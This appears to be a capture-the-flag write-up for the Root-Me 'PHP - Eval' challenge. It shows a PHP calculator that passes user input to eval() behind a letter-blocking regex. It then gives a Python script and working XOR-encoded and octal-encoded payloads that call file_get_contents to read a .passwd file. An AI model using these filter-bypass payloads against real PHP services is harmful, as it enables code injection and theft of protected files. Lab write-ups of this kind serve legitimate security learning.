
# PHP - Eval  ( Non-alphanumeric PHP code )

Challenge category : WEB-SERVER \
Difficulty : MEDIUM \
Links :  https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval / https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval

For this challenge there are 2 solutions , but in this writeup I will show only the first one 

Let's analyze the challenge  : 
```
Statement
Find a vulnerability in this service and exploit it.

Note : the flag is in .passwd file.
```
Source code : 
```php
<html>
<head>
</head>
<body>
 
<h4> PHP Calc </h4>
 
<form action='index.php' method='post'>
    <input type='text' id='input' name='input' />
    <input type='submit' />
<?php
 
if (isset($_POST['input'])) {
    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
        print '<fieldset><legend>Result</legend>';
        eval('print '.$_POST['input'].";");
        print '</fieldset>';
    }
    else
        echo "<p>Dangerous code detected</p>";
}
?>
</form>
</body>
</html>

```
As the index says it should be a PHP calculator , but it uses the eval() function to do "calculations" and this makes it vulnerable to code injection 
![](./images/1.png)
![](./images/2.png)

We can enter numbers or special characters but not letters because the input is filtered by the preg_match() function : 
```php
 if(!preg_match('/[a-zA-Z`]/', $_POST['input']))
```

There are 2 ways to bypass this filter ( as mentioned above) , in this case we will have the eval() function perform XOR operations on special characters 
```
RAW   |  BINARY
/     =  00101111
            ⊕
_     =  01011111  

p     =  01110000

In PHP  XOR=^ so ('/' ^ '_')= 'p'

Example: 
p = ('/'^'_')
a = ('!'^'@')
s = ('('^'[')
s = ('('^'[')
w = ('('^'_')
d = ('$'^'@')

passwd   =  ('/'^'_').('!'^'@').('('^'[').('('^'[').('('^'_').('$'^'@')
```
Let's try entering the string above into the input field

![](./images/3.png)

It returned `passwd` 

Now let's try reading the contents of the `.passwd` file (which contains the flag as mentioned in the challege description) \
To do this we need to convert the `file_get_contents('.passwd')` function to XOR operations , I wrote a python script (don't mind the not-so-clean code ) : 

```python
import re
charset = ['!','$','%','&','/','(',')','=','{','[',']','}',',',';','.',':','-','_','+','*','~','#','\'','@','<','>','|','?','^',' ']

plain_text="file_get_contents('.passwd')"
pt_dict=[*plain_text]
payload=f""
fnd=0
for letter in pt_dict:
    fnd=0
    if not re.match('[a-zA-Z]',letter):
        if letter == '\'' : 
            letter='\\\''
        if letter == '"' : 
            letter = '\\"'
        payload+=f"'{letter}'."
        continue
    for char1 in charset :
        if fnd:
            fnd=1
            break
        for char2 in charset:
            if ord(char1)^ord(char2)==ord(letter):
                #print (f"{letter} : ('{char1}'^'{char2}'). \n ")
                payload+=f"('{char1}'^'{char2}')."
                fnd=1
                break
        
print (payload)
```
The script output will be : `('&'^'@').(')'^'@').(','^'@').('%'^'@').'_'.('['^'<').('%'^'@').('/'^'[').'_'.('='^'^').('/'^'@').('.'^'@').('/'^'[').('%'^'@').('.'^'@').('/'^'[').('('^'[').'('.'\''.'.'.('/'^'_').('!'^'@').('('^'[').('('^'[').('('^'_').('$'^'@').'\''.')'` \
Let's try entering the string above into the input field

![](./images/4.png)

As we can see the function is not executed but is printed , so let's try another way of executing a function : `(function)(arg)` so `(file_get_contents)(.passwd)`
```
(('&'^'@').(')'^'@').(','^'@').('%'^'@').'_'.('['^'<').('%'^'@').('/'^'[').'_'.('='^'^').('/'^'@').('.'^'@').('/'^'[').('%'^'@').('.'^'@').('/'^'[').('('^'['))('.'.('/'^'_').('!'^'@').('('^'[').('('^'[').('('^'_').('$'^'@'))
```

![](./images/5.png) \


Great ! it works. ✅


\ 
\
\
The other method is similar but uses octal encoding of characters, it is easier but I like more difficult methods 😜


```
 "\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163"("\56\160\141\163\163\167\144")
 ```




